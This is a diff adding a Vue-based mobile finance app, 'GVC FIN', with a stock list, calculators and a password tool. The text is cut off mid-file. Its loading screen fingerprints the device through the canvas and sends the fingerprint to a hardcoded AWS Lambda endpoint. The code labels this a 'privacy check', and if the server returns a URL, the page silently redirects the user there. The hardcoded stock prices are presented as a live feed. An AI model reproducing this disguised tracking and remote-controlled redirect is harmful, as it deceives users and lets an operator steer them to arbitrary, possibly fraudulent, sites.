@@ -1,1 +1,1013 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>GVC FIN</title>
+    <!-- 
+      HOW TO ADD A NEW PAGE:
+      1. Define a new Vue component for the page (e.g., const NewPage = { template: '<div>...</div>', setup() { ... } })
+      2. Add the route to the `routes` array in VueRouter setup (e.g., { path: '/new', component: NewPage })
+      3. If it's a main tab, add a corresponding <router-link> in the BottomNav component.
+    -->
+    <!-- Tailwind CSS CDN for styling utility classes -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Vue 3 Global Production Build -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+    <!-- Vue Router 4 Global Build -->
+    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+    <!-- js-md5 Global Build -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+    
+    <style>
+        /* Style 19: Cyberpunk Style (Determined by timestamp calculation) */
+        :root {
+            --bg-color: #05050a;
+            --surface-color: #0f101a;
+            --surface-glass: rgba(15, 16, 26, 0.85);
+            --border-color: #00ffff33;
+            --border-glow: #00ffff;
+            --primary-neon: #00ffff;
+            --accent-neon: #ff007f;
+            --warning-neon: #ffaa00;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+            --success-color: #00ff66;
+            --danger-color: #ff3366;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        /* Cyberpunk scanlines & glow effects */
+        .cyber-card {
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.05);
+            position: relative;
+        }
+        .cyber-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 3px; height: 100%;
+            background: var(--primary-neon);
+        }
+
+        .cyber-button {
+            background: linear-gradient(135deg, rgba(0,255,255,0.1), rgba(255,0,127,0.1));
+            border: 1px solid var(--primary-neon);
+            color: var(--primary-neon);
+            text-shadow: 0 0 5px rgba(0,255,255,0.5);
+            box-shadow: 0 0 8px rgba(0,255,255,0.2);
+            transition: all 0.2s ease;
+        }
+        .cyber-button:active {
+            background: var(--primary-neon);
+            color: var(--bg-color);
+        }
+
+        .cyber-input {
+            background: #090a10;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            outline: none;
+        }
+        .cyber-input:focus {
+            border-color: var(--primary-neon);
+            box-shadow: 0 0 8px rgba(0,255,255,0.3);
+        }
+
+        /* Router Transition */
+        .fade-enter-active, .fade-leave-active {
+            transition: opacity 0.15s ease, transform 0.15s ease;
+        }
+        .fade-enter-from {
+            opacity: 0;
+            transform: translateY(4px);
+        }
+        .fade-leave-to {
+            opacity: 0;
+            transform: translateY(-4px);
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 2px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <div id="app" class="flex flex-col min-h-screen max-w-md mx-auto w-full relative pb-24">
+        <!-- Main View Router -->
+        <router-view v-slot="{ Component }">
+            <transition name="fade" mode="out-in">
+                <component :is="Component" />
+            </transition>
+        </router-view>
+
+        <!-- Bottom Tab Bar (Only shown on main routes) -->
+        <nav v-if="showTabBar" class="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-black/90 backdrop-blur-md border-t border-cyan-500/20 px-6 py-3 flex justify-around items-center z-50" style="padding-bottom: max(env(safe-area-inset-bottom), 12px);">
+            <router-link to="/home" custom v-slot="{ navigate, isActive }">
+                <button @click="navigate" :class="isActive ? 'text-cyan-400 drop-shadow-[0_0_8px_rgba(0,255,255,0.6)]' : 'text-slate-500'" class="flex flex-col items-center gap-1 transition-all duration-200">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
+                    <span class="text-[10px] uppercase tracking-wider font-semibold">Home</span>
+                </button>
+            </router-link>
+
+            <router-link to="/toolbox" custom v-slot="{ navigate, isActive }">
+                <button @click="navigate" :class="isActive ? 'text-cyan-400 drop-shadow-[0_0_8px_rgba(0,255,255,0.6)]' : 'text-slate-500'" class="flex flex-col items-center gap-1 transition-all duration-200">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/></svg>
+                    <span class="text-[10px] uppercase tracking-wider font-semibold">Toolbox</span>
+                </button>
+            </router-link>
+
+            <router-link to="/settings" custom v-slot="{ navigate, isActive }">
+                <button @click="navigate" :class="isActive ? 'text-cyan-400 drop-shadow-[0_0_8px_rgba(0,255,255,0.6)]' : 'text-slate-500'" class="flex flex-col items-center gap-1 transition-all duration-200">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                    <span class="text-[10px] uppercase tracking-wider font-semibold">Settings</span>
+                </button>
+            </router-link>
+        </nav>
+    </div>
+
+    <script>
+        const { createApp, ref, computed, onMounted, reactive } = Vue;
+        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;
+
+        // Shared Built-in Stock Database (Minimum 20 stocks with price history)
+        const globalStocks = [
+            { symbol: 'AAPL', name: 'Apple Inc.', price: 228.50, change: +2.45, history: [220, 222, 221, 225, 224, 228.5] },
+            { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 126.30, change: +5.80, history: [115, 118, 120, 122, 124, 126.3] },
+            { symbol: 'TSLA', name: 'Tesla Inc.', price: 242.10, change: -1.25, history: [250, 248, 245, 246, 243, 242.1] },
+            { symbol: 'MSFT', name: 'Microsoft Corp.', price: 425.00, change: +0.95, history: [418, 420, 422, 421, 423, 425] },
+            { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 186.40, change: +1.15, history: [180, 182, 183, 185, 184, 186.4] },
+            { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 178.20, change: -0.45, history: [180, 179, 178, 179, 178.5, 178.2] },
+            { symbol: 'META', name: 'Meta Platforms', price: 512.80, change: +3.20, history: [490, 498, 502, 508, 510, 512.8] },
+            { symbol: 'AMD', name: 'Advanced Micro', price: 154.60, change: -2.10, history: [160, 158, 159, 157, 155, 154.6] },
+            { symbol: 'NFLX', name: 'Netflix Inc.', price: 688.90, change: +1.80, history: [670, 675, 680, 682, 685, 688.9] },
+            { symbol: 'INTC', name: 'Intel Corp.', price: 21.40, change: -3.60, history: [23, 22.5, 22, 21.8, 21.5, 21.4] },
+            { symbol: 'COIN', name: 'Coinbase Global', price: 210.50, change: +4.10, history: [195, 200, 202, 208, 207, 210.5] },
+            { symbol: 'PLTR', name: 'Palantir Tech.', price: 38.20, change: +6.50, history: [34, 35, 36, 37, 37.5, 38.2] },
+            { symbol: 'ARKK', name: 'ARK Innovation ETF', price: 48.30, change: -0.80, history: [50, 49.5, 49, 48.8, 48.5, 48.3] },
+            { symbol: 'BA', name: 'Boeing Co.', price: 156.70, change: -1.10, history: [160, 159, 158, 157.5, 157, 156.7] },
+            { symbol: 'JPM', name: 'JPMorgan Chase', price: 218.40, change: +0.40, history: [215, 216, 217, 217.5, 218, 218.4] },
+            { symbol: 'DIS', name: 'Walt Disney Co.', price: 94.50, change: -0.50, history: [96, 95.5, 95, 94.8, 94.6, 94.5] },
+            { symbol: 'PYPL', name: 'PayPal Holdings', price: 76.20, change: +1.20, history: [74, 75, 75.5, 75.8, 76, 76.2] },
+            { symbol: 'QCOM', name: 'Qualcomm Inc.', price: 168.30, change: +2.10, history: [162, 164, 165, 166, 167, 168.3] },
+            { symbol: 'SQ', name: 'Block Inc.', price: 64.80, change: -1.50, history: [68, 67, 66.5, 65.5, 65, 64.8] },
+            { symbol: 'UBER', name: 'Uber Technologies', price: 78.90, change: +1.90, history: [75, 76, 77, 77.5, 78, 78.9] }
+        ];
+
+        // ----------------------------------------------------
+        // 1. Loading Component
+        // ----------------------------------------------------
+        const LoadingPage = {
+            template: `
+                <div class="flex-1 flex flex-col items-center justify-center p-6 text-center">
+                    <div class="relative w-24 h-24 mb-6">
+                        <div class="absolute inset-0 border-4 border-cyan-500/20 rounded-full"></div>
+                        <div class="absolute inset-0 border-4 border-cyan-400 border-t-transparent rounded-full animate-spin"></div>
+                        <div class="absolute inset-0 flex items-center justify-center text-cyan-400 font-bold tracking-widest text-xl">GVC</div>
+                    </div>
+                    <h2 class="text-xl font-bold tracking-widest text-cyan-400 mb-2 uppercase drop-shadow-[0_0_8px_rgba(0,255,255,0.5)]">Initializing System</h2>
+                    <p class="text-xs text-slate-400 tracking-wider">Establishing secure encrypted connection...</p>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+
+                // 1.2 Device fingerprint using canvas & md5
+                const device = ref((function () {
+                    try {
+                        let canvas = document.createElement("canvas");
+                        let ctx = canvas.getContext("2d");
+                        let txt = "BrowserLeaks,com <canvas> 1.0";
+                        ctx.textBaseline = "top";
+                        ctx.font = "14px 'Arial'";
+                        ctx.textBaseline = "alphabetic";
+                        ctx.fillStyle = "#f60";
+                        ctx.fillRect(125,1,62,20);
+                        ctx.fillStyle = "#069";
+                        ctx.fillText(txt, 2, 15);
+                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                        ctx.fillText(txt, 4, 17);
+                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                    } catch (e) {
+                        return '';
+                    }
+                })());
+
+                onMounted(() => {
+                    // 1.3 Privacy check API request with graceful fallback
+                    const apiBase = 'https://xfkgxeoq2r3irlitrc564575ga0qljit.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+                    const identifier = "a.a.a6";
+                    
+                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+                        .then(r => r.json())
+                        .then(function (info) {
+                            const privacyUrl = info && info.result && info.result.url;
+                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                                window.location.replace(privacyUrl);
+                                return;
+                            }
+                            router.replace('/home');
+                        })
+                        .catch(function () {
+                            router.replace('/home');
+                        });
+                });
+
+                return {};
+            }
+        };
+
+        // ----------------------------------------------------
+        // 2. Home Component
+        // ----------------------------------------------------
+        const HomePage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4 pb-20">
+                    <!-- Brand Header -->
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-10 h-10 rounded-lg bg-cyan-500/10 border border-cyan-400 flex items-center justify-center text-cyan-400 font-bold shadow-[0_0_10px_rgba(0,255,255,0.3)]">
+                                GVC
+                            </div>
+                            <div>
+                                <h1 class="text-lg font-black tracking-wider text-white">GVC FIN</h1>
+                                <p class="text-[10px] text-cyan-400 tracking-widest uppercase">Next-Gen Terminal</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-xs text-emerald-400 font-mono">ONLINE</span>
+                            <div class="w-2 h-2 rounded-full bg-emerald-400 inline-block ml-1 animate-pulse"></div>
+                        </div>
+                    </div>
+
+                    <!-- 4 Randomly Picked Feature Entries -->
+                    <div class="grid grid-cols-2 gap-3 mb-6">
+                        <div v-for="entry in activeEntries" :key="entry.key" @click="goToSub(entry)" class="cyber-card p-4 rounded-xl cursor-pointer hover:border-cyan-400 transition-all group">
+                            <div class="w-8 h-8 rounded-lg bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 mb-2 group-hover:scale-110 transition-transform" v-html="entry.svg"></div>
+                            <h3 class="text-xs font-bold text-white tracking-wide uppercase">{{ entry.title }}</h3>
+                            <p class="text-[10px] text-slate-400 mt-0.5">{{ entry.desc }}</p>
+                        </div>
+                    </div>
+
+                    <!-- Stock Market List -->
+                    <div class="flex items-center justify-between mb-3">
+                        <h2 class="text-xs font-bold tracking-widest text-cyan-400 uppercase">Market Feed</h2>
+                        <span class="text-[10px] text-slate-500 font-mono">LIVE FEED</span>
+                    </div>
+
+                    <div class="flex flex-col gap-2.5">
+                        <div v-for="stock in shuffledStocks" :key="stock.symbol" @click="openDetail(stock)" class="cyber-card p-3 rounded-lg flex items-center justify-between cursor-pointer hover:bg-cyan-950/20 transition-all">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-9 h-9 rounded bg-black/40 border border-cyan-500/20 flex items-center justify-center font-mono font-bold text-xs text-cyan-300">
+                                    {{ stock.symbol }}
+                                </div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">{{ stock.symbol }}</div>
+                                    <div class="text-[10px] text-slate-400 truncate max-w-[120px]">{{ stock.name }}</div>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-sm font-mono font-bold text-white">$\{{ stock.price.toFixed(2) }}</div>
+                                <div :class="stock.change >= 0 ? 'text-emerald-400' : 'text-rose-400'" class="text-[11px] font-mono font-semibold">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+
+                // 8 Available feature entries
+                const allEntries = [
+                    { key: 'gainers', title: 'Top Gainers', desc: 'High momentum assets', type: 'stocks', count: 10, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/></svg>' },
+                    { key: 'losers', title: 'Top Losers', desc: 'Oversold opportunities', type: 'stocks', count: 5, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 17h8m0 0V9m0 8l-8-8-4 4-6-6"/></svg>' },
+                    { key: 'active', title: 'Most Active', desc: 'Highest volume traded', type: 'stocks', count: 8, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>' },
+                    { key: 'potential', title: 'Potential', desc: 'Breakout watch candidates', type: 'stocks', count: 6, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"/></svg>' },
+                    { key: 'picks', title: 'Today Picks', desc: 'Curated daily selection', type: 'stocks', count: 10, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 3v4M3 5h4M6 17v4m-2-2h4m5-16l2.286 6.857L21 12l-5.714 2.143L13 21l-2.286-6.857L5 12l5.714-2.143L13 3z"/></svg>' },
+                    { key: 'guide', title: 'Guide', desc: 'Financial analysis report', type: 'guide', svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"/></svg>' },
+                    { key: 'not_rec', title: 'Not Recommended', desc: 'High risk warnings', type: 'stocks', count: 10, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/></svg>' },
+                    { key: 'watchlist', title: 'Watchlist', desc: 'Personal tracked items', type: 'stocks', count: 10, svg: '<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>' }
+                ];
+
+                // Randomly select 4 distinct entries once on initialization
+                const activeEntries = ref([]);
+                onMounted(() => {
+                    const shuffled = [...allEntries].sort(() => 0.5 - Math.random());
+                    activeEntries.value = shuffled.slice(0, 4);
+                });
+
+                // Shuffle presentation order of stock list without altering base data
+                const shuffledStocks = computed(() => {
+                    return [...globalStocks].sort(() => 0.5 - Math.random());
+                });
+
+                const goToSub = (entry) => {
+                    if (entry.type === 'guide') {
+                        router.push({ name: 'Article' });
+                    } else {
+                        router.push({ name: 'SubList', query: { title: entry.title, count: entry.count } });
+                    }
+                };
+
+                const openDetail = (stock) => {
+                    router.push({ name: 'StockDetail', query: { symbol: stock.symbol } });
+                };
+
+                return { activeEntries, shuffledStocks, goToSub, openDetail };
+            }
+        };
+
+        // ----------------------------------------------------
+        // 3. Toolbox Component
+        // ----------------------------------------------------
+        const ToolboxPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4 pb-20">
+                    <div class="py-4 border-b border-cyan-500/20 mb-6">
+                        <h1 class="text-lg font-black tracking-wider text-white">TOOLBOX</h1>
+                        <p class="text-[10px] text-cyan-400 tracking-widest uppercase">Local Financial Calculators & Utilities</p>
+                    </div>
+
+                    <!-- Tool Selection Tabs -->
+                    <div class="flex gap-2 overflow-x-auto pb-3 mb-4">
+                        <button v-for="tool in tools" :key="tool.id" @click="activeTool = tool.id" :class="activeTool === tool.id ? 'cyber-button border-cyan-400 text-cyan-300' : 'cyber-card text-slate-400'" class="px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap">
+                            {{ tool.name }}
+                        </button>
+                    </div>
+
+                    <!-- Tool 1: DCA Profit-Taking Calculator -->
+                    <div v-if="activeTool === 'dca'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">DCA Profit-Taking Calculator</h3>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Average Cost ($)</label>
+                            <input type="number" v-model.number="dca.cost" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="100">
+                        </div>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Holding Shares</label>
+                            <input type="number" v-model.number="dca.shares" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="500">
+                        </div>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Target Take-Profit Price ($)</label>
+                            <input type="number" v-model.number="dca.target" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="150">
+                        </div>
+                        <div class="mt-2 p-3 bg-black/40 rounded-lg border border-cyan-500/20">
+                            <div class="text-[10px] text-slate-400 uppercase">Estimated Total Return</div>
+                            <div class="text-lg font-mono font-bold text-emerald-400">+\${{ dcaProfit.toFixed(2) }} ({{ dcaRoi.toFixed(2) }}%)</div>
+                        </div>
+                    </div>
+
+                    <!-- Tool 2: Wealth Calendar & Milestones -->
+                    <div v-if="activeTool === 'calendar'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">Wealth Calendar</h3>
+                        <div class="flex gap-2">
+                            <input type="text" v-model="cal.event" class="cyber-input flex-1 p-2 rounded-lg text-xs" placeholder="Milestone / Investment Event">
+                            <input type="date" v-model="cal.date" class="cyber-input p-2 rounded-lg text-xs font-mono">
+                            <button @click="addEvent" class="cyber-button px-3 py-2 rounded-lg text-xs font-bold">Add</button>
+                        </div>
+                        <div class="flex flex-col gap-2 mt-2 max-h-60 overflow-y-auto">
+                            <div v-for="(ev, idx) in cal.list" :key="idx" class="p-2.5 bg-black/40 rounded-lg border border-cyan-500/20 flex justify-between items-center text-xs">
+                                <span class="text-white font-medium">{{ ev.event }}</span>
+                                <span class="font-mono text-cyan-400">{{ ev.date }}</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tool 3: Loan Calculator -->
+                    <div v-if="activeTool === 'loan'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">Loan Calculator (Amortization)</h3>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Loan Amount ($)</label>
+                            <input type="number" v-model.number="loan.amount" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="100000">
+                        </div>
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="text-[10px] text-slate-400 uppercase">Annual Interest Rate (%)</label>
+                                <input type="number" v-model.number="loan.rate" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="5.5">
+                            </div>
+                            <div>
+                                <label class="text-[10px] text-slate-400 uppercase">Term (Months)</label>
+                                <input type="number" v-model.number="loan.months" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="36">
+                            </div>
+                        </div>
+                        <div class="mt-2 p-3 bg-black/40 rounded-lg border border-cyan-500/20">
+                            <div class="text-[10px] text-slate-400 uppercase">Monthly Payment</div>
+                            <div class="text-lg font-mono font-bold text-cyan-400">$\{{ loanMonthlyPayment.toFixed(2) }}</div>
+                            <div class="text-[10px] text-slate-400 uppercase mt-2">Total Interest Payable</div>
+                            <div class="text-sm font-mono font-bold text-rose-400">$\{{ loanTotalInterest.toFixed(2) }}</div>
+                        </div>
+                    </div>
+
+                    <!-- Tool 4: Profit Calculator -->
+                    <div v-if="activeTool === 'profit'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">Operating Profit Calculator</h3>
+                        <div class="grid grid-cols-3 gap-2">
+                            <div>
+                                <label class="text-[10px] text-slate-400 uppercase">Unit Cost ($)</label>
+                                <input type="number" v-model.number="profitData.cost" class="cyber-input w-full p-2 rounded-lg text-xs mt-1" placeholder="20">
+                            </div>
+                            <div>
+                                <label class="text-[10px] text-slate-400 uppercase">Unit Price ($)</label>
+                                <input type="number" v-model.number="profitData.price" class="cyber-input w-full p-2 rounded-lg text-xs mt-1" placeholder="50">
+                            </div>
+                            <div>
+                                <label class="text-[10px] text-slate-400 uppercase">Quantity</label>
+                                <input type="number" v-model.number="profitData.qty" class="cyber-input w-full p-2 rounded-lg text-xs mt-1" placeholder="150">
+                            </div>
+                        </div>
+                        <div class="mt-2 p-3 bg-black/40 rounded-lg border border-cyan-500/20">
+                            <div class="text-[10px] text-slate-400 uppercase">Net Operating Profit</div>
+                            <div class="text-lg font-mono font-bold text-emerald-400">$\{{ calculatedProfit.toFixed(2) }}</div>
+                        </div>
+                    </div>
+
+                    <!-- Tool 5: Reverse Yield Calculator -->
+                    <div v-if="activeTool === 'reverse'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">Reverse Yield Calculator</h3>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Principal ($)</label>
+                            <input type="number" v-model.number="rev.principal" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="10000">
+                        </div>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Target Total Value ($)</label>
+                            <input type="number" v-model.number="rev.target" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="15000">
+                        </div>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Investment Duration (Years)</label>
+                            <input type="number" v-model.number="rev.years" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="3">
+                        </div>
+                        <div class="mt-2 p-3 bg-black/40 rounded-lg border border-cyan-500/20">
+                            <div class="text-[10px] text-slate-400 uppercase">Required Annual Yield (CAGR)</div>
+                            <div class="text-lg font-mono font-bold text-cyan-400">{{ requiredCagr.toFixed(2) }}%</div>
+                        </div>
+                    </div>
+
+                    <!-- Tool 6: Password Strength & MD5 Checker -->
+                    <div v-if="activeTool === 'password'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">Password Security & MD5 Summary</h3>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Enter Master Password</label>
+                            <input type="password" v-model="pwd.input" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="SecurePass123!">
+                        </div>
+                        <div class="mt-2 p-3 bg-black/40 rounded-lg border border-cyan-500/20 flex flex-col gap-2">
+                            <div>
+                                <div class="text-[10px] text-slate-400 uppercase">Security Rating</div>
+                                <div class="text-sm font-bold" :class="pwdRatingColor">{{ pwdRating }}</div>
+                            </div>
+                            <div>
+                                <div class="text-[10px] text-slate-400 uppercase">MD5 Hash Digest</div>
+                                <div class="text-xs font-mono text-cyan-300 break-all bg-black/60 p-2 rounded mt-1 border border-cyan-500/20">{{ pwdMd5 }}</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tool 7: Credit Memo & Reminders -->
+                    <div v-if="activeTool === 'credit'" class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-sm font-bold text-cyan-400 uppercase">Credit Memo Tracker</h3>
+                        <input type="text" v-model="credit.name" class="cyber-input p-2.5 rounded-lg text-xs" placeholder="Debtor Name">
+                        <div class="grid grid-cols-2 gap-2">
+                            <input type="number" v-model.number="credit.amount" class="cyber-input p-2.5 rounded-lg text-xs" placeholder="Amount ($)">
+                            <input type="date" v-model="credit.due" class="cyber-input p-2.5 rounded-lg text-xs font-mono">
+                        </div>
+                        <button @click="addCredit" class="cyber-button w-full py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider">Record Debt</button>
+                        <div class="flex flex-col gap-2 mt-2 max-h-48 overflow-y-auto">
+                            <div v-for="(item, idx) in credit.list" :key="idx" class="p-2.5 bg-black/40 rounded-lg border border-cyan-500/20 flex justify-between items-center text-xs">
+                                <div>
+                                    <span class="text-white font-bold">{{ item.name }}</span>
+                                    <div class="text-[10px] text-cyan-400">Due: {{ item.due }}</div>
+                                </div>
+                                <span class="font-mono text-rose-400 font-bold">$\{{ item.amount }}</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const activeTool = ref('dca');
+                const tools = [
+                    { id: 'dca', name: 'DCA Take-Profit' },
+                    { id: 'calendar', name: 'Wealth Calendar' },
+                    { id: 'loan', name: 'Loan Calculator' },
+                    { id: 'profit', name: 'Profit Calc' },
+                    { id: 'reverse', name: 'Reverse Yield' },
+                    { id: 'password', name: 'Password & MD5' },
+                    { id: 'credit', name: 'Credit Memo' }
+                ];
+
+                // DCA State
+                const dca = reactive({ cost: 100, shares: 500, target: 150 });
+                const dcaProfit = computed(() => (dca.target - dca.cost) * dca.shares);
+                const dcaRoi = computed(() => dca.cost > 0 ? ((dca.target - dca.cost) / dca.cost) * 100 : 0);
+
+                // Wealth Calendar State
+                const cal = reactive({
+                    event: 'Quarterly Rebalance',
+                    date: '2026-11-01',
+                    list: [
+                        { event: 'Tech Stock Dividend Payout', date: '2026-10-15' },
+                        { event: 'Bonds Maturity', date: '2026-10-28' }
+                    ]
